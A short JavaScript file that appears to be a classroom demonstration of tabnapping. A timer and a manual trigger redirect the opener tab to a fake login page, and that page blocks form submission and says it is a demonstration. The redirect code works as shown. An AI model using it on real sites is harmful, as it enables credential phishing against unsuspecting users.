
// TABNAPPING ATTACK 

// Automatic redirect after 3 seconds
setTimeout(() => {
  if (window.opener) {
    window.opener.location = "fake_login_index.html";
  }
}, 3000);

// Optional manual trigger
function triggerTabnapping() {
  if (window.opener) {
    window.opener.location = "fake_login_index.html";
    alert("Tabnapping triggered! Original tab redirected.");
  } else {
    alert("window.opener is null. Protected by noopener.");
  }
}

// FAKE LOGIN PAGE HANDLER 

// Prevent real form submission
function fakeLogin(event) {
  event.preventDefault();
  alert("⚠ This is a fake login page used for a tabnapping demonstration.");
}

// Optional console log for demo clarity
window.addEventListener("load", () => {
  console.log("Page loaded successfully.");
});
